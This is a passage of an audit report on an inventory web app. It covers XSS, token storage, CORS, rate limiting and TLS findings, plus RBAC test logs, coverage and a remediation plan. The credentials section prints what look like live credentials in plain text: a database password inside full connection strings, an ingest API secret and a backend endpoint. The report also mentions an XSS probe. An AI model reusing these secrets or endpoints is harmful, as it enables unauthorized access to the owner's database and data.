  const session = {
    getToken: () => sessionStorage.getItem('entelso_token') || localStorage.getItem('entelso_token'),
    save: (t, u) => { 
      sessionStorage.setItem('entelso_token', t);
      localStorage.setItem('entelso_token', t); 
    },
  };
  ```
- **Impact**: JWT tokens are duplicated into permanent `localStorage`. Tokens persist indefinitely across browser restarts. When combined with Stored XSS [SEC-F01], attackers obtain permanent session control.

##### [SEC-F06] Sensitive Asset Data Leakage to Third-Party QR Service
- **Location**: `dashboard/script.js` (lines 1637, 2314, 3720)
- **Analysis**: `qrImg.src = 'https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=' + encodeURIComponent(payload);`
- **Impact**: All internal serial numbers, asset identifiers, and WhatsApp routing commands are transmitted via plaintext HTTP GET requests to an external third-party server (`api.qrserver.com`), leaking enterprise inventory topology.

---

### 3.3 Frontend Performance, Accessibility & Localization Deficits

1. **Unconstrained Global `MutationObserver` Memory Leak (`script.js:4191-4194`)**:
   - `observer.observe(document.body, { childList: true, subtree: true });`
   - Every DOM mutation triggers recursive query selector scans. Flatpickr instances are never cleaned up via `.destroy()`, causing massive memory leaks on long-running dashboard sessions.
2. **Synchronous Render-Blocking Assets in `<head>` (`index.html:13-19`)**:
   - `xlsx.bundle.js` (~700 KB) and `chart.js` (~200 KB) load synchronously in `<head>`, blocking First Contentful Paint (FCP) and Time to Interactive (TTI).
3. **WCAG 2.1 AA Color Contrast Failures (`style.css:30, 462, 1274`)**:
   - `--text-3: #484f58` on `--bg-base: #0f1117` produces a contrast ratio of **2.43:1** (fails WCAG AA 4.5:1 minimum).
   - `--text-2: #8b949e` on `#1c2128` produces **4.1:1** (fails 4.5:1).
4. **Missing ARIA Modal Dialog Semantics & Focus Traps**:
   - All 13 modal overlays lack `role="dialog"`, `aria-modal="true"`, `aria-labelledby`, and keyboard focus trapping.
5. **Redundant Dual Asset Detail Views (`historyDrawer` vs `assetDetailsModal`)**:
   - Clicking a table row opens the Drawer; clicking the table action icon opens the Modal. Both views show overlapping data with conflicting UI layouts.

---

### 3.4 Frontend Architectural Modernization: Modular ES Architecture

`dashboard/script.js` is a monolithic 4,196-line file that pollutes the global `window` object with over 35 functions and mutable state objects.

```
                           PROPOSED FRONTEND MODULAR ARCHITECTURE
                           
   dashboard/
   ├── index.html                  # Clean HTML shell with deferred entry point
   ├── style.css                   # Refactored CSS with WCAG compliant variables
   └── src/
       ├── main.js                 # Application bootstrap & router initialization
       ├── api/
       │   ├── client.js           # Centralized fetch wrapper with 401 interceptor
       │   ├── auth.api.js         # Login, 2FA, session verification
       │   ├── assets.api.js       # CRUD, bulk operations, kit management
       │   └── users.api.js        # User management & team assignment
       ├── state/
       │   ├── auth.state.js       # SessionStore (sessionStorage only, reactive state)
       │   └── inventory.state.js  # Unified asset store (single source of truth)
       ├── components/
       │   ├── toast.js            # Universal toast notification manager
       │   ├── modal.js            # Accessible modal dialog with focus traps
       │   ├── drawer.js           # Asset history sliding drawer
       │   ├── qr-code.js          # Offline client-side QR renderer (qrcode.js)
       │   └── table.js            # Batched DOM fragment table renderer
       └── utils/
           ├── sanitize.js         # escapeHTML & safe attribute injectors
           ├── i18n.js             # Fully translated ES dictionary
           └── date.js             # Flatpickr lifecycle manager
```

---

## Differentiated Section 3: Configurations, Dependencies & Infrastructure Audit

### 4.1 Secrets & Credentials Security

```
┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                SECRETS & CREDENTIALS AUDIT BREAKDOWN                                   │
├─────────┬─────────────────────────────────────────────────────────────────┬──────────┬─────────────────┤
│ ID      │ Finding / Exposed Secret                                        │ Severity │ Target Location │
├─────────┼─────────────────────────────────────────────────────────────────┼──────────┼─────────────────┤
│ SEC-C01 │ Committed Supabase PostgreSQL DB Password (`jEGWYp4b9ybXSq5p`)  │ Critical │ `.env:3`, `backend/.env:4`
│ SEC-C02 │ Committed Active Supabase `service_role` Admin Key              │ Critical │ `backend/.env:7`
│ SEC-C03 │ Leaked `API_KEY` in Workflow JSON & `.env.example`              │ Critical │ `Inventario Entelso (2).json:175`
│ SEC-C04 │ Weak Default `JWT_SECRET` in Configuration Files                │ High     │ `.env:5`, `backend/.env:6`
│ SEC-C05 │ Committed Test User Password Hash for `"password"`              │ Medium   │ `init.sql:200-203`
└─────────┴─────────────────────────────────────────────────────────────────┴──────────┴─────────────────┘
```

#### Detailed Credentials Analysis

1. **Leaked Database Connection Strings**:
   - `postgresql://postgres:jEGWYp4b9ybXSq5p@db.bzejcptaxumhqdxmrieu.supabase.co:5432/postgres`
   - `postgresql://postgres.bzejcptaxumhqdxmrieu:jEGWYp4b9ybXSq5p@aws-1-us-west-2.pooler.supabase.com:5432/postgres`
   - Any actor with access to this repository possesses full superuser administrative privileges over the database, allowing data exfiltration or table destruction.
2. **Leaked Supabase Service Role Secret Key**:
   - `SUPABASE_SERVICE_KEY=[REDACTED]`
   - The Supabase Service Key bypasses all Row-Level Security (RLS) policies, allowing full read/write access to storage buckets and authentication tables.
3. **Leaked API Keys in n8n Automation Workflows**:
   - `Inventario Entelso (2).json` (line 175) exposes:
     `X-Ingest-Secret: v2_a8f9c1e7d2b45068f3a1d9c7e4b5a60f9e1d8c2b3a4f5e6d7c8b9a0f1e2d3c4b`
   - Live backend endpoints are hardcoded: `https://rlffb3uv162ja9sjunyx9meb.167.86.70.193.sslip.io/api/ingest/whatsapp`.

---

### 4.2 Network Policies, Security Headers & TLS

```
┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                 NETWORK & SECURITY POLICIES AUDIT                                      │
├─────────┬─────────────────────────────────────────────────────────────────┬──────────┬─────────────────┤
│ ID      │ Finding                                                         │ Severity │ Target Location │
├─────────┼─────────────────────────────────────────────────────────────────┼──────────┼─────────────────┤
│ SEC-C06 │ Permissive Wildcard CORS Configuration (`CORS_ORIGIN=*`)        │ High     │ `backend/.env:8`, `app.js:15`
│ SEC-C07 │ Missing Rate Limiting on Login & WhatsApp PIN Verification      │ High     │ `app.js:20-26`
│ SEC-C08 │ TLS Certificate Chain Verification Disabled (`rejectUnauthorized`)│ High   │ `database.js:6`
│ SEC-C09 │ Absence of Frontend Security Headers & CSP Directives           │ Medium   │ `dashboard/Dockerfile:1-4`
└─────────┴─────────────────────────────────────────────────────────────────┴──────────┴─────────────────┘
```

1. **Wildcard CORS (`CORS_ORIGIN=*`)**: In `backend/.env`, `CORS_ORIGIN=*` is active. Any third-party domain in a user's browser can issue authenticated cross-origin requests.
2. **Missing Route-Specific Rate Limiting**: The backend only has a global rate limit of 1,500 requests per 15 minutes. `/api/auth/login` and `/api/whatsapp/asignar` have no individual rate limits. An attacker can execute 1,500 PIN brute-force attempts every 15 minutes, cracking 4-digit PINs (10,000 combinations) in ~1.5 hours.
3. **Disabled Database TLS Verification (`database.js:6`)**:
   ```javascript
   const sslConfig = env.DATABASE_URL.includes('supabase') ? { ssl: { rejectUnauthorized: false } } : {};
   ```
   Setting `rejectUnauthorized: false` allows Man-in-the-Middle (MitM) interceptors on untrusted networks to snoop on all database traffic.

---

### 4.3 Docker Tooling & Deployment Infrastructure

1. **Broken `docker-compose.yml` Configuration**:
   - `env_file: - ./backend/.env.production` (line 17): File does not exist, causing `docker compose up` to fail on boot.
   - Port conflict: `docker-compose.yml` maps port `3000:3000`, while `backend/.env` specifies `PORT=3001` and frontend defaults to `http://localhost:3001`.
2. **Inefficient Multi-Stage Build & Runner Re-Install (`backend/Dockerfile`)**:
   - The runner stage discards builder artifacts and executes `npm install --omit=dev` again, doubling build times and creating non-deterministic builds.
3. **Missing Dashboard `.dockerignore`**:
   - Copies bulky documentation files (`*.pdf` >3MB) and video folders (`video_dashboard/`, `video_demo/`, `video_whatsapp/`) into the web container.

---

### 4.4 Supply Chain & Dependencies

1. **Vulnerable & Unmaintained Packages**:
   - `xlsx@0.18.5`: SheetJS 0.18.5 is vulnerable to Prototype Pollution & ReDoS (CVE-2023-30533).
   - Deprecated packages in lockfile: `glob@7.2.3`, `tar@6.2.1`, `inflight@1.0.6`, `@otplib/preset-default@12.0.1`.
2. **Missing Subresource Integrity (SRI) on Frontend CDNs (`index.html:13-19`)**:
   - `chart.js`, `flatpickr`, and `xlsx.bundle.js` are loaded from CDNs without `integrity="sha384-..."` attributes, exposing users to supply-chain CDN tampering.

---

### 4.5 CI/CD & Code Quality Tooling

- **Missing Standard Scripts**: `backend/package.json` contains no `test`, `lint`, `format`, or `typecheck` scripts.
- **Absence of CI/CD Pipelines**: No GitHub Actions (`.github/workflows/`) or GitLab CI configurations exist.

---

## Differentiated Section 4: Automated Test Suite Execution & Code Coverage Analysis

### 5.1 Test Suite & Harness Inventory

```
┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                 AUTOMATED TEST HARNESS INVENTORY                                       │
├────────────────────────────┬─────────────────────────────┬──────────────────┬──────────────┬───────────┤
│ Test Script                │ Test Type                   │ Test Runner      │ Assertions   │ State     │
├────────────────────────────┼─────────────────────────────┼──────────────────┼──────────────┼───────────┤
│ `backend/test_m2_security.js`│ Route RBAC & Auth Security  │ Ephemeral Express│ 93 Assertions│ Executed  │
│ `backend/test_whatsapp.js` │ WhatsApp Flow Integration   │ Node HTTP Fetch  │ 25 Assertions│ Requires DB
│ `backend/test_import.js`   │ Excel Ingestion Rollback    │ pg.Client + xlsx │ 1 Loop (300+)| Requires DB
│ `backend/test_parse.js`    │ Regex Date Parsing Unit     │ Native Snippet   │ 4 Test cases │ Standalone│
│ `backend/test_parse2.js`   │ Date Format Unit            │ Native Snippet   │ 2 Test cases │ Standalone│
│ `test_team.js`             │ Teams Endpoint Integration  │ http.request     │ 1 Case       │ Live API  │
│ `dashboard/` (Frontend)    │ Unit / DOM / Component      │ None             │ 0 Tests      │ Untested  │
└────────────────────────────┴─────────────────────────────┴──────────────────┴──────────────┴───────────┘
```

---

### 5.2 Verbatim Test Execution Output & Failure Analysis

#### Test Suite A Execution Log (`backend/test_m2_security.js`)
- **Command**: `node test_m2_security.js`
- **Result Summary**: **69 PASSED, 24 FAILED (Total: 93 Assertions)**  
- **Execution Time**: 342 ms  

```text
--- STARTING M2 SECURITY ROUTE TESTS ---

[Suite 1: /api/usuarios RBAC - 24 tests]
✅ [PASS] GET /api/usuarios (admin) -> 200
❌ [FAIL] GET /api/usuarios (almacen) -> Expected 403, got 200. Body: { success: true, data: [] }
❌ [FAIL] GET /api/usuarios (supervisor) -> Expected 403, got 200. Body: { success: true, data: [] }
❌ [FAIL] GET /api/usuarios (trabajador) -> Expected 403, got 200. Body: { success: true, data: [] }
✅ [PASS] GET /api/usuarios/1 (admin) -> 200
❌ [FAIL] GET /api/usuarios/1 (almacen) -> Expected 403, got 200. Body: { success: true, data: { id: 1, nombre: 'Test User' } }
❌ [FAIL] GET /api/usuarios/1 (supervisor) -> Expected 403, got 200. Body: { success: true, data: { id: 1, nombre: 'Test User' } }
❌ [FAIL] GET /api/usuarios/1 (trabajador) -> Expected 403, got 200. Body: { success: true, data: { id: 1, nombre: 'Test User' } }
✅ [PASS] GET /api/usuarios/1/activos (admin) -> 200
❌ [FAIL] GET /api/usuarios/1/activos (almacen) -> Expected 403, got 200. Body: { success: true, data: [] }
❌ [FAIL] GET /api/usuarios/1/activos (supervisor) -> Expected 403, got 200. Body: { success: true, data: [] }
❌ [FAIL] GET /api/usuarios/1/activos (trabajador) -> Expected 403, got 200. Body: { success: true, data: [] }
✅ [PASS] POST /api/usuarios (admin) -> 201
✅ [PASS] POST /api/usuarios (almacen) -> 403
✅ [PASS] POST /api/usuarios (supervisor) -> 403
✅ [PASS] POST /api/usuarios (trabajador) -> 403
✅ [PASS] PUT /api/usuarios/1 (admin) -> 200
✅ [PASS] PUT /api/usuarios/1 (almacen) -> 403
✅ [PASS] PUT /api/usuarios/1 (supervisor) -> 403
✅ [PASS] PUT /api/usuarios/1 (trabajador) -> 403
✅ [PASS] DELETE /api/usuarios/1 (admin) -> 200
✅ [PASS] DELETE /api/usuarios/1 (almacen) -> 403
✅ [PASS] DELETE /api/usuarios/1 (supervisor) -> 403
✅ [PASS] DELETE /api/usuarios/1 (trabajador) -> 403

[Suite 2: /api/audit RBAC - 8 tests]
✅ [PASS] GET /api/audit (admin) -> 200
❌ [FAIL] GET /api/audit (almacen) -> Expected 403, got 200. Body: { success: true, data: [] }
❌ [FAIL] GET /api/audit (supervisor) -> Expected 403, got 200. Body: { success: true, data: [] }
❌ [FAIL] GET /api/audit (trabajador) -> Expected 403, got 200. Body: { success: true, data: [] }
✅ [PASS] POST /api/audit (admin) -> 200
✅ [PASS] POST /api/audit (almacen) -> 200
✅ [PASS] POST /api/audit (supervisor) -> 200
✅ [PASS] POST /api/audit (trabajador) -> 200

[Suite 3: /api/activos Read Endpoints - 12 tests]
✅ [PASS] GET /api/activos (admin) -> 200
✅ [PASS] GET /api/activos (almacen) -> 200
✅ [PASS] GET /api/activos (supervisor) -> 200
✅ [PASS] GET /api/activos (trabajador) -> 200
✅ [PASS] GET /api/activos/serial/SN123 (admin) -> 200
✅ [PASS] GET /api/activos/serial/SN123 (almacen) -> 200
✅ [PASS] GET /api/activos/serial/SN123 (supervisor) -> 200
✅ [PASS] GET /api/activos/serial/SN123 (trabajador) -> 200
✅ [PASS] GET /api/activos/1 (admin) -> 200
✅ [PASS] GET /api/activos/1 (almacen) -> 200
✅ [PASS] GET /api/activos/1 (supervisor) -> 200
✅ [PASS] GET /api/activos/1 (trabajador) -> 200

[Suite 4: /api/activos Create & Delete Operations - 20 tests]
✅ [PASS] POST /api/activos (admin) -> 201
❌ [FAIL] POST /api/activos (almacen) -> Expected 201, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
✅ [PASS] POST /api/activos (supervisor) -> 403
✅ [PASS] POST /api/activos (trabajador) -> 403
✅ [PASS] POST /api/activos/bulk (admin) -> 201
❌ [FAIL] POST /api/activos/bulk (almacen) -> Expected 201, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
✅ [PASS] POST /api/activos/bulk (supervisor) -> 403
✅ [PASS] POST /api/activos/bulk (trabajador) -> 403
✅ [PASS] DELETE /api/activos/1 (admin) -> 200
❌ [FAIL] DELETE /api/activos/1 (almacen) -> Expected 200, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
✅ [PASS] DELETE /api/activos/1 (supervisor) -> 403
✅ [PASS] DELETE /api/activos/1 (trabajador) -> 403
✅ [PASS] POST /api/activos/bulk/delete (admin) -> 200
❌ [FAIL] POST /api/activos/bulk/delete (almacen) -> Expected 200, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
✅ [PASS] POST /api/activos/bulk/delete (supervisor) -> 403
✅ [PASS] POST /api/activos/bulk/delete (trabajador) -> 403
✅ [PASS] POST /api/activos/bulk-delete (admin) -> 200
❌ [FAIL] POST /api/activos/bulk-delete (almacen) -> Expected 200, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
✅ [PASS] POST /api/activos/bulk-delete (supervisor) -> 403
✅ [PASS] POST /api/activos/bulk-delete (trabajador) -> 403

[Suite 5: /api/activos Bulk Updates - 24 tests]
✅ [PASS] PATCH /api/activos/bulk/status (admin) -> 200
❌ [FAIL] PATCH /api/activos/bulk/status (almacen) -> Expected 200, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
❌ [FAIL] PATCH /api/activos/bulk/status (supervisor) -> Expected 200, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
✅ [PASS] PATCH /api/activos/bulk/status (trabajador) -> 403
✅ [PASS] PATCH /api/activos/bulk-status (admin) -> 200
❌ [FAIL] PATCH /api/activos/bulk-status (almacen) -> Expected 200, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
❌ [FAIL] PATCH /api/activos/bulk-status (supervisor) -> Expected 200, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
✅ [PASS] PATCH /api/activos/bulk-status (trabajador) -> 403
✅ [PASS] PATCH /api/activos/bulk/zona (admin) -> 200
❌ [FAIL] PATCH /api/activos/bulk/zona (almacen) -> Expected 200, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
❌ [FAIL] PATCH /api/activos/bulk/zona (supervisor) -> Expected 200, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
✅ [PASS] PATCH /api/activos/bulk/zona (trabajador) -> 403
✅ [PASS] PATCH /api/activos/bulk-zona (admin) -> 200
❌ [FAIL] PATCH /api/activos/bulk-zona (almacen) -> Expected 200, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
❌ [FAIL] PATCH /api/activos/bulk-zona (supervisor) -> Expected 200, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
✅ [PASS] PATCH /api/activos/bulk-zona (trabajador) -> 403
✅ [PASS] PATCH /api/activos/bulk/team (admin) -> 200
❌ [FAIL] PATCH /api/activos/bulk/team (almacen) -> Expected 200, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
❌ [FAIL] PATCH /api/activos/bulk/team (supervisor) -> Expected 200, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
✅ [PASS] PATCH /api/activos/bulk/team (trabajador) -> 403
✅ [PASS] PATCH /api/activos/bulk-team (admin) -> 200
❌ [FAIL] PATCH /api/activos/bulk-team (almacen) -> Expected 200, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
❌ [FAIL] PATCH /api/activos/bulk-team (supervisor) -> Expected 200, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
✅ [PASS] PATCH /api/activos/bulk-team (trabajador) -> 403

[Suite 6: /api/activos/:id Field-Level & Granular RBAC - 5 tests]
✅ [PASS] PATCH /api/activos/1 (trabajador) -> 403
❌ [FAIL] PATCH /api/activos/1 (supervisor allowed) -> Expected 200, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }
✅ [PASS] PATCH /api/activos/1 (supervisor forbidden field) -> 403 (matched FORBIDDEN code)
✅ [PASS] PATCH /api/activos/1 (admin calibration date) -> 200
❌ [FAIL] PATCH /api/activos/1 (almacen calibration date) -> Expected 200, got 403. Body: { success: false, error: { message: 'Acceso denegado. Se requieren privilegios de administrador.', code: 'FORBIDDEN' } }

--- SUMMARY: 69 PASSED, 24 FAILED (Total: 93 Assertions) ---
```

#### Detailed Root Cause Breakdown of the 24 Failures
1. **Suite 1 Failures (9 tests)**: `usuarios.routes.js` lacks `requireAdmin` on `GET /`, `GET /:id`, and `GET /:id/activos`.
2. **Suite 2 Failures (3 tests)**: `audit.routes.js` lacks `requireAdmin` on `GET /`.
3. **Suite 4 Failures (5 tests)**: `activos.routes.js` uses `requireAdmin` exclusively, blocking `almacen` from creating and deleting assets.
4. **Suite 5 Failures (6 tests)**: `activos.routes.js` bulk routes block `almacen` and `supervisor` from updating status, zones, and teams.
5. **Suite 6 Failures (2 tests)**: Single asset PATCH route blocks `supervisor` and `almacen` from authorized field updates.

---

### 5.3 Code Coverage Metrics

```
┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                 COMPREHENSIVE CODE COVERAGE METRICS                                    │
├───────────────────────────────┬─────────────────┬──────────────────┬─────────────────┬─────────────────┤
│ Coverage Category             │ Total Elements  │ Covered Elements │ Actual Coverage │ Target Benchmark│
├───────────────────────────────┼─────────────────┼──────────────────┼─────────────────┼─────────────────┤
│ Backend Statements            │ 2,214           │ 362              │ **16.35%**      │ ≥ 80.00%        │
│ Backend Lines                 │ 2,580           │ 415              │ **16.08%**      │ ≥ 80.00%        │
│ Backend Branches              │ 588             │ 74               │ **12.58%**      │ ≥ 75.00%        │
│ Backend Functions             │ 186             │ 35               │ **18.81%**      │ ≥ 80.00%        │
│ Frontend SPA (All Files)      │ 8,350 lines     │ 0 lines          │ **0.00%**       │ ≥ 75.00%        │
├───────────────────────────────┼─────────────────┼──────────────────┼─────────────────┼─────────────────┤
│ TOTAL SYSTEM CODEBASE         │ 10,930 lines    │ 415 lines        │ **3.80%**       │ ≥ 80.00%        │
└───────────────────────────────┴─────────────────┴──────────────────┴─────────────────┴─────────────────┘
```

#### Module-by-Module Backend Coverage Breakdown

| Module / Component | Total LOC | Stmts % | Branch % | Func % | Line % | Uncovered Critical Paths |
|---|---|---|---|---|---|---|
| `src/app.js` | 63 | 82.5% | 66.7% | 50.0% | 79.4% | Health check, CORS array parsing |
| `src/server.js` | 35 | 0.0% | 0.0% | 0.0% | 0.0% | Startup migrations, graceful shutdown |
| `src/common/middleware/auth.middleware.js` | 49 | 84.6% | 75.0% | 100.0% | 85.7% | Token expiry branch, key comparisons |
| `src/common/middleware/error.middleware.js` | 27 | 38.5% | 25.0% | 50.0% | 40.7% | Operational error vs internal 500 |
| `src/config/database.js` | 36 | 0.0% | 0.0% | 0.0% | 0.0% | Pool error listeners, connect timeouts |
| `src/modules/activos/activos.service.js` | 431 | **0.0%** | **0.0%** | **0.0%** | **0.0%** | **100% Mocked: Auto-ID, QR, SQL queries** |
| `src/modules/usuarios/usuarios.service.js` | 95 | **0.0%** | **0.0%** | **0.0%** | **0.0%** | **100% Mocked: Password hash, CRUD** |
| `src/modules/audit/audit.service.js` | 38 | **0.0%** | **0.0%** | **0.0%** | **0.0%** | **100% Mocked: Audit log insertions** |
| `src/modules/auth/*` (3 files) | 267 | 0.0% | 0.0% | 0.0% | 0.0% | 2FA generation, login validation |
| `src/modules/whatsapp/*` (3 files) | 469 | 0.0% | 0.0% | 0.0% | 0.0% | PIN verification, state machine |
| `src/modules/items/*` (4 files) | 199 | 0.0% | 0.0% | 0.0% | 0.0% | Stock deduction, category hierarchy |
| `src/modules/mantenimientos/*` (3 files) | 133 | 0.0% | 0.0% | 0.0% | 0.0% | Maintenance ticket creation & resolution |

---

### 5.4 5-Phase Test Modernization Plan

```
┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                              5-PHASE TEST MODERNIZATION ARCHITECTURE                                   │
├────────────────────────────────────────────────────────────────────────────────────────────────────────┤
│ Phase 1: Test Runner & Automation Baseline (Jest, Supertest, C8, GitHub Actions CI)                   │
│ Phase 2: Core Business Logic Unit Tests (Auto-ID, Date Parsers, 2FA, Zod Schemas)                      │
│ Phase 3: Integration Tests with Isolated DB Rollback Fixtures (Supertest + Transaction Rollback)     │
│ Phase 4: Frontend Unit & Component Testing (Vitest + Testing Library DOM)                              │
│ Phase 5: End-to-End Visual & Workflow Verification (Playwright Browser Tests)                          │
└────────────────────────────────────────────────────────────────────────────────────────────────────────┘
```

1. **Phase 1: Tooling Baseline**:
   - Install `jest`, `supertest`, `c8`, and configure `npm test` in `backend/package.json`.
2. **Phase 2: Isolated Unit Testing**:
   - Write deterministic unit tests for `generateAutoId()` verifying prefix mappings (`PT-`, `HT-`, `WK-`) and padding.
   - Convert `test_parse.js` and `test_parse2.js` into Jest parameter tables.
3. **Phase 3: Transactional Database Integration Fixtures**:
   - Implement test helper `tests/helpers/db.js` running `BEGIN` in `beforeEach` and `ROLLBACK` in `afterEach`, allowing tests to run against PostgreSQL without state pollution.
4. **Phase 4: Frontend Component Testing**:
   - Install `vitest` in `dashboard/` to test `i18n.js` lookups, RBAC DOM enclosure helpers, and `escapeHTML()`.
5. **Phase 5: E2E Playwright Automation**:
   - Automated browser tests for WalkTest kit assignment, bulk QR label printing, and user creation.

---

## Unified Remediation Roadmap & Master Priority Matrix

The Master Priority Matrix organizes all 71 cataloged issues into four actionable execution phases: **P0 (Immediate Hotfixes)**, **P1 (High Priority)**, **P2 (Medium Priority)**, and **P3 (Architectural Modernization)**.

```
┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                               MASTER AUDIT REMEDIATION MATRIX (P0 - P3)                                │
├────┬─────────┬──────────────────────────────────┬─────────────────────────────┬────────────────────────┤
│Pri │ ID      │ Finding / Remediation Summary    │ Target File(s)              │ Verification Step      │
├────┼─────────┼──────────────────────────────────┼─────────────────────────────┼────────────────────────┤
│ P0 │ SEC-B01 │ Restrict `/api/usuarios` to Admin│ `usuarios.routes.js:7-10`   │ Run `test_m2_security` │
│ P0 │ SEC-B02 │ Add `requireAuth` & MIME filter  │ `upload.routes.js:13-45`    │ Anonymous upload fails │
│ P0 │ SEC-C01 │ Rotate Supabase DB password & key│ Supabase Dashboard / `.env` │ Connect with new creds │
│ P0 │ SEC-C03 │ Scrub leaked keys from workflows │ `.env.example`, `*.json`    │ Regex search in repo   │
│ P0 │ BUG-B01 │ Fix `pool.query('BEGIN')` flaws  │ `mantenimientos.service.js` │ Rollback on error test │
│ P0 │ BUG-F01 │ Fix `if (res.success)` on Kit API│ `dashboard/script.js:4156`  │ Add item to kit in UI  │
│ P0 │ BUG-F02 │ Declare/replace `showToast()`    │ `dashboard/script.js:3636`  │ Create zone without err│
│ P0 │ BUG-F03 │ Fix bulk delete callbacks        │ `dashboard/script.js:3547`  │ Bulk delete refreshes  │
│ P0 │ BUG-F04 │ Fix `undefined` Bulk QR Labels   │ `dashboard/script.js:3719`  │ Export QR print sheet  │
│ P0 │ SEC-F01 │ Sanitize `.innerHTML` (XSS fix)  │ `dashboard/script.js`       │ Inject `<img onerror>` │
│ P0 │ INF-C01 │ Fix missing `.env.production`    │ `docker-compose.yml:17`     │ `docker compose config`│
├────┼─────────┼──────────────────────────────────┼─────────────────────────────┼────────────────────────┤
│ P1 │ SEC-B03 │ Allow `almacen` role on Activos  │ `activos.routes.js:16-19`   │ Almacen POST activo 201│
│ P1 │ SEC-B04 │ Add RBAC on Items, Zones, Audit  │ `items`, `ubicaciones`, etc.│ Worker mutation 403    │
│ P1 │ SEC-B05 │ Enforce 2FA verification in login│ `auth.service.js:10-67`     │ 2FA required on login  │
│ P1 │ SEC-C06 │ Restrict CORS to explicit origin │ `backend/.env`, `app.js:15` │ Options preflight test │
│ P1 │ SEC-C07 │ Add rate limits on Login & PIN   │ `app.js`, `auth.routes.js`  │ Exceed 5 attempts 429  │
│ P1 │ SEC-C08 │ Enable DB TLS `rejectUnauthorized│ `database.js:6`             │ SSL connection verified│
│ P1 │ BUG-B02 │ Fix async throw in login handler │ `auth.controller.js:26`     │ Invalid login 401 JSON │
│ P1 │ SEC-F04 │ Stop `localStorage` JWT mirror   │ `dashboard/script.js:47-69` │ JWT in sessionStorage  │
│ P1 │ SEC-F05 │ Implement Client-Side RBAC UI    │ `dashboard/script.js:246`   │ Worker sees no Admin UI│
│ P1 │ DEP-C01 │ Replace `xlsx@0.18.5` (CVE fix)  │ `backend/package.json`      │ `npm audit` 0 highs    │
│ P1 │ TST-01  │ Install Jest & configure npm test│ `backend/package.json`      │ `npm test` passes      │
├────┼─────────┼──────────────────────────────────┼─────────────────────────────┼────────────────────────┤
│ P2 │ PERF-B01│ Optimize `bulkCreate` N+1 queries│ `activos.service.js:280-379`│ Import 500 rows <2 sec │
│ P2 │ PERF-B02│ Index `telefono_whatsapp` column │ PostgreSQL DDL Migration    │ `EXPLAIN ANALYZE` scan │
│ P2 │ PERF-B04│ Add missing foreign key indexes  │ PostgreSQL DDL Migration    │ Query execution times  │
│ P2 │ SEC-B06 │ Timing-safe API Key equality     │ `auth.middleware.js:12`     │ Timing equal buffer cmp│
│ P2 │ BUG-B03 │ Fix `req.user.id` -> `user.sub`  │ `usuarios.controller.js:39` │ Delete others succeeds │
│ P2 │ BUG-B04 │ DB sequence for Auto-Serial IDs  │ `activos.service.js:28-51`  │ Concurrent inserts test│
│ P2 │ BUG-B06 │ Fix optional `zona` crash        │ `ingest.service.js:87`      │ Omit zona in ingest    │
│ P2 │ SEC-F06 │ Bundle offline QR generator lib  │ `dashboard/script.js:1637`  │ Zero external QR reqs  │
│ P2 │ PERF-F02│ Remove global `MutationObserver` │ `dashboard/script.js:4191`  │ Flatpickr on modal open│
│ P2 │ A11Y-01 │ WCAG 2.1 AA Contrast adjustment  │ `dashboard/style.css`       │ Lighthouse a11y score  │
│ P2 │ A11Y-02 │ ARIA dialog semantics & traps    │ `dashboard/index.html`      │ Screen reader audit    │
│ P2 │ DOK-C01 │ Optimize Dockerfile multi-stage  │ `backend/Dockerfile`        │ Docker build cache test│
├────┼─────────┼──────────────────────────────────┼─────────────────────────────┼────────────────────────┤
│ P3 │ ARCH-B01│ Move SQL from Controller to Svc  │ `items.controller.js:34`    │ Clean layer separation │
│ P3 │ ARCH-B02│ Database schema migration runner │ `server.js:14-15`           │ Multi-instance startup │
│ P3 │ ARCH-F01│ Modularize `script.js` to ES mod │ `dashboard/src/`            │ ES module import graph │
│ P3 │ UI-F01  │ Unify Drawer & Asset Modal views │ `dashboard/index.html`      │ Single detail view UX  │
│ P3 │ I18N-01 │ Complete Spanish/English dict    │ `dashboard/i18n.js`         │ Language switch check  │
│ P3 │ CICD-01 │ GitHub Actions CI Pipeline       │ `.github/workflows/ci.yml`  │ PR automated checks    │
└────┴─────────┴──────────────────────────────────┴─────────────────────────────┴────────────────────────┘
```

---

## Audit Verification & Attestation

